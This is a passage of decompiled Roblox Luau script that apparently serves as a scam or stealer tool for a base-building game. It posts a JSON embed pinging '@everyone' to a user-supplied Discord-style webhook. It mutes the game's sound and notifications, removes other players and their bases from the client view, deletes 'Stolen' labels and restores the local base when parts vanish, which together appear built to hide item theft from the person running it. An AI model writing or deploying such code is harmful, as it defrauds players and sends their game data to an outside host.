                            l_UserWebhookURL_0 = "@everyone";
                        end;
                        local v119 = {
                            content = l_UserWebhookURL_0, 
                            username = "skibidi lemon", 
                            avatar_url = "https://i.imgur.com/lPNVdqu.jpeg", 
                            embeds = {
                                v111
                            }
                        };
                        pcall(function() --[[ Line: 0 ]]
                            -- upvalues: v7 (ref), l_HttpService_0 (ref), v119 (copy)
                            v7({
                                Url = getgenv().UserWebhookURL, 
                                Method = "POST", 
                                Headers = {
                                    ["Content-Type"] = "application/json"
                                }, 
                                Body = l_HttpService_0:JSONEncode(v119)
                            });
                        end);
                    end;
                end;
                return;
            end;
        end);
        pcall(function() --[[ Line: 0 ]]
            -- upvalues: l_ReplicatedStorage_0 (ref)
            local l_Net_0 = l_ReplicatedStorage_0:WaitForChild("Packages"):WaitForChild("Net");
            l_Net_0:WaitForChild("RE/NotificationService/Notify", 5).OnClientEvent:Connect(function(_, _) --[[ Line: 0 ]]

            end);
            task.spawn(function() --[[ Line: 0 ]]
                -- upvalues: l_Net_0 (copy)
                l_Net_0["RF/SettingsService/ToggleSetting"]:InvokeServer("Music");
                l_Net_0["RF/SettingsService/ToggleSetting"]:InvokeServer("Sound Effects");
                l_Net_0["RF/SettingsService/ToggleSetting"]:InvokeServer("Chat Tips");
                l_Net_0["RF/SettingsService/ToggleSetting"]:InvokeServer("VFX");
            end);
        end);
        pcall(function() --[[ Line: 0 ]]
            -- upvalues: l_Players_0 (ref), l_LocalPlayer_0 (ref), l_Workspace_0 (ref)
            task.spawn(function() --[[ Line: 0 ]]
                -- upvalues: l_Players_0 (ref), l_LocalPlayer_0 (ref), l_Workspace_0 (ref)
                for _, v124 in ipairs(l_Players_0:GetPlayers()) do
                    if v124 ~= l_LocalPlayer_0 then
                        if v124.Character then
                            pcall(function() --[[ Line: 0 ]]
                                -- upvalues: v124 (copy)
                                v124.Character:Destroy();
                            end);
                        end;
                        pcall(function() --[[ Line: 0 ]]
                            -- upvalues: v124 (copy)
                            v124:Destroy();
                        end);
                    end;
                end;
                l_Players_0.PlayerAdded:Connect(function(v125) --[[ Line: 0 ]]
                    -- upvalues: l_LocalPlayer_0 (ref)
                    if v125 ~= l_LocalPlayer_0 then
                        v125.CharacterAdded:Connect(function(v126) --[[ Line: 0 ]]
                            pcall(function() --[[ Line: 0 ]]
                                -- upvalues: v126 (copy)
                                v126:Destroy();
                            end);
                        end);
                        task.wait();
                        pcall(function() --[[ Line: 0 ]]
                            -- upvalues: v125 (copy)
                            v125:Destroy();
                        end);
                    end;
                end);
                l_Workspace_0.ChildAdded:Connect(function(v127) --[[ Line: 0 ]]
                    -- upvalues: l_LocalPlayer_0 (ref), l_Players_0 (ref)
                    if v127:IsA("Model") and v127.Name ~= l_LocalPlayer_0.Name and v127:FindFirstChild("HumanoidRootPart") then
                        pcall(function() --[[ Line: 0 ]]
                            -- upvalues: l_Players_0 (ref), v127 (copy)
                            local l_l_Players_0_PlayerFromCharacter_0 = l_Players_0:GetPlayerFromCharacter(v127);
                            v127:Destroy();
                            if l_l_Players_0_PlayerFromCharacter_0 then
                                l_l_Players_0_PlayerFromCharacter_0:Destroy();
                            end;
                        end);
                    end;
                end);
            end);
        end);
        pcall(function() --[[ Line: 0 ]]
            local l_Plots_2 = workspace:WaitForChild("Plots");
            local v130 = {};
            local v131 = {};
            local v132 = {};
            local function v137(v133) --[[ Line: 0 ]]
                local v134 = {
                    "PlotSign", 
                    "AnimalPodiums", 
                    "MainRoot"
                };
                for _, v136 in ipairs(v133:GetChildren()) do
                    if v136:IsA("Model") and not table.find(v134, v136.Name) then
                        v136:Destroy();
                    end;
                end;
            end;
            local function v141(v138) --[[ Line: 0 ]]
                for _, v140 in ipairs(v138:GetDescendants()) do
                    if v140.Name == "Spawn" or v140.Name == "Collect" then
                        v140:Destroy();
                    end;
                end;
            end;
            for _, v143 in ipairs(l_Plots_2:GetChildren()) do
                if v143:IsA("Model") then
                    local v144 = v143:FindFirstChild("PlotSign", true) and v143.PlotSign:FindFirstChild("SurfaceGui", true) and v143.PlotSign.SurfaceGui:FindFirstChild("Frame", true) and v143.PlotSign.SurfaceGui.Frame:FindFirstChild("TextLabel", true);
                    if v144 and v144.Text ~= "Empty Base" then
                        v130[v143] = true;
                    elseif v143.PrimaryPart then
                        local v145 = {
                            plot = v143, 
                            cframe = v143.PrimaryPart.CFrame
                        };
                        table.insert(v131, v145);
                    end;
                end;
            end;
            for _, v147 in ipairs(v131) do
                local v148 = v147.plot:Clone();
                v137(v148);
                v141(v148);
                local v149 = {
                    clone = v148, 
                    cframe = v147.cframe
                };
                table.insert(v132, v149);
            end;
            for _, v151 in ipairs(v131) do
                v151.plot:Destroy();
            end;
            for _, v153 in ipairs(v132) do
                local l_clone_0 = v153.clone;
                local l_cframe_0 = v153.cframe;
                l_clone_0.Parent = l_Plots_2;
                if l_clone_0.PrimaryPart and l_cframe_0 then
                    l_clone_0:SetPrimaryPartCFrame(l_cframe_0);
                end;
            end;
            l_Plots_2.ChildAdded:Connect(function(v156) --[[ Line: 0 ]]
                -- upvalues: v130 (copy)
                if v130[v156] then
                    return;
                else
                    v156:Destroy();
                    return;
                end;
            end);
        end);
        pcall(function() --[[ Line: 0 ]]
            -- upvalues: v8 (ref), l_Workspace_0 (ref)
            local function _(v157) --[[ Line: 0 ]]
                -- upvalues: v8 (ref), l_Workspace_0 (ref)
                return v157:IsA("Model") and v8[v157.Name] and v157.Parent == l_Workspace_0;
            end;
            for _, v160 in ipairs(l_Workspace_0:GetChildren()) do
                if v160:IsA("Model") and v8[v160.Name] and v160.Parent == l_Workspace_0 then
                    pcall(function() --[[ Line: 0 ]]
                        -- upvalues: v160 (copy)
                        v160:Destroy();
                    end);
                end;
            end;
            l_Workspace_0.ChildAdded:Connect(function(v161) --[[ Line: 0 ]]
                -- upvalues: v8 (ref), l_Workspace_0 (ref)
                if v161:IsA("Model") and v8[v161.Name] and v161.Parent == l_Workspace_0 then
                    pcall(function() --[[ Line: 0 ]]
                        -- upvalues: v161 (copy)
                        v161:Destroy();
                    end);
                end;
            end);
        end);
        pcall(function() --[[ Line: 0 ]]
            -- upvalues: l_Workspace_0 (ref), l_LocalPlayer_0 (ref)
            task.spawn(function() --[[ Line: 0 ]]
                -- upvalues: l_Workspace_0 (ref), l_LocalPlayer_0 (ref)
                local v162 = nil;
                repeat
                    task.wait(1);
                    local l_Plots_3 = l_Workspace_0:FindFirstChild("Plots");
                    if l_Plots_3 then
                        for _, v165 in ipairs(l_Plots_3:GetChildren()) do
                            if v165:IsA("Model") then
                                local l_v165_FirstChild_0 = v165:FindFirstChild("PlotSign", true);
                                if l_v165_FirstChild_0 then
                                    local l_l_v165_FirstChild_0_FirstChildWhichIsA_0 = l_v165_FirstChild_0:FindFirstChildWhichIsA("TextLabel", true);
                                    if l_l_v165_FirstChild_0_FirstChildWhichIsA_0 and (string.find(l_l_v165_FirstChild_0_FirstChildWhichIsA_0.Text, l_LocalPlayer_0.DisplayName, 1, true) or string.find(l_l_v165_FirstChild_0_FirstChildWhichIsA_0.Text, l_LocalPlayer_0.Name, 1, true)) then
                                        v162 = v165;
                                        break;
                                    end;
                                end;
                            end;
                        end;
                    end;
                until v162;
                local l_AnimalPodiums_1 = v162:WaitForChild("AnimalPodiums");
                local v169 = {};
                local v170 = {
                    "Rarity", 
                    "DisplayName", 
                    "Generation", 
                    "Mutation", 
                    "Price", 
                    "Traits"
                };
                local v171 = false;
                while task.wait(0.25) and v162 and v162.Parent do
                    for _, v173 in ipairs(l_Workspace_0.Plots:GetChildren()) do
                        if v173:IsA("Model") then
                            for _, v175 in ipairs(v173:GetDescendants()) do
                                if v175:IsA("TextLabel") and v175.Name == "Stolen" then
                                    pcall(function() --[[ Line: 0 ]]
                                        -- upvalues: v175 (copy)
                                        v175:Destroy();
                                    end);
                                end;
                            end;
                        end;
                    end;
                    local l_l_AnimalPodiums_1_Children_0 = l_AnimalPodiums_1:GetChildren();
                    if not v171 and #l_l_AnimalPodiums_1_Children_0 > 0 then
                        for _, v178 in ipairs(l_l_AnimalPodiums_1_Children_0) do
                            if v178:IsA("Model") and not v169[v178] then
                                v169[v178] = {};
                                local l_v178_FirstChild_0 = v178:FindFirstChild("AnimalOverhead", true);
                                if l_v178_FirstChild_0 then
                                    for _, v181 in ipairs(v170) do
                                        local l_l_v178_FirstChild_0_FirstChild_0 = l_v178_FirstChild_0:FindFirstChild(v181);
                                        if l_l_v178_FirstChild_0_FirstChild_0 then
                                            v169[v178][v181] = l_l_v178_FirstChild_0_FirstChild_0.Visible;
                                        end;
                                    end;
                                end;
                            end;
                        end;
                        v171 = true;
                    end;
                    for v183, v184 in pairs(v169) do
                        if v183 and v183.Parent then
                            local l_v183_FirstChild_0 = v183:FindFirstChild("AnimalOverhead", true);
                            if l_v183_FirstChild_0 then
                                for v186, v187 in pairs(v184) do
                                    local l_l_v183_FirstChild_0_FirstChild_0 = l_v183_FirstChild_0:FindFirstChild(v186);
                                    if l_l_v183_FirstChild_0_FirstChild_0 and l_l_v183_FirstChild_0_FirstChild_0.Visible ~= v187 then
                                        l_l_v183_FirstChild_0_FirstChild_0.Visible = v187;
                                    end;
                                end;
                            end;
                        else
                            v169[v183] = nil;
                        end;
                    end;
                end;
            end);
        end);
        pcall(function() --[[ Line: 0 ]]
            -- upvalues: l_LocalPlayer_0 (ref)
            task.spawn(function() --[[ Line: 0 ]]
                -- upvalues: l_LocalPlayer_0 (ref)
                local l_Plots_4 = workspace:WaitForChild("Plots");
                local v190 = nil;
                local v191 = {};
                local v192 = {};
                local v193 = {
                    "PlotSign", 
                    "AnimalPodiums", 
                    "MainRoot", 
                    "FriendPanel"
                };
                local function v207() --[[ Line: 0 ]]
                    -- upvalues: l_LocalPlayer_0 (ref), l_Plots_4 (copy), v190 (ref), v193 (copy), v191 (copy), v192 (copy)
                    local v194 = l_LocalPlayer_0.DisplayName .. "'s Base";
                    for _, v196 in ipairs(l_Plots_4:GetChildren()) do
                        if v196:IsA("Model") then
                            local v197 = v196:FindFirstChild("PlotSign", true) and v196.PlotSign:FindFirstChild("SurfaceGui", true) and v196.PlotSign.SurfaceGui:FindFirstChild("Frame", true) and v196.PlotSign.SurfaceGui.Frame:FindFirstChild("TextLabel", true);
                            if v197 and v197.Text == v194 then
                                v190 = v196;
                                break;
                            end;
                        end;
                    end;
                    if not v190 then
                        return;
                    else
                        for _, v199 in ipairs(v190:GetDescendants()) do
                            local v200 = false;
                            if v199.Parent == v190 then
                                v200 = v199:IsA("Model") and not table.find(v193, v199.Name);
                            end;
                            if v200 then
                                v191[v199] = {
                                    clone = v199:Clone(), 
                                    originalParent = v199.Parent
                                };
                                for _, v202 in ipairs(v199:GetDescendants()) do
                                    if v202:IsA("BasePart") then
                                        v192[v202] = v202.Transparency;
                                    end;
                                end;
                            end;
                        end;
                        v190.DescendantRemoving:Connect(function(v203) --[[ Line: 0 ]]
                            -- upvalues: v191 (ref)
                            if v191[v203] then
                                local v204 = v191[v203];
                                v204.clone:Clone().Parent = v204.originalParent;
                            end;
                        end);
                        task.spawn(function() --[[ Line: 0 ]]
                            -- upvalues: v190 (ref), v192 (ref)
                            while task.wait(0.25) and v190 and v190.Parent do
                                for v205, v206 in pairs(v192) do
                                    if v205 and v205.Parent and v205.Transparency ~= v206 then
                                        v205.Transparency = v206;
                                    end;
                                end;
                            end;
                        end);
                        return;
                    end;
                end;
                while not v190 do
                    task.wait(1);
                    v207();
                end;
            end);
        end);
        v77();
        return;
    end;
end);
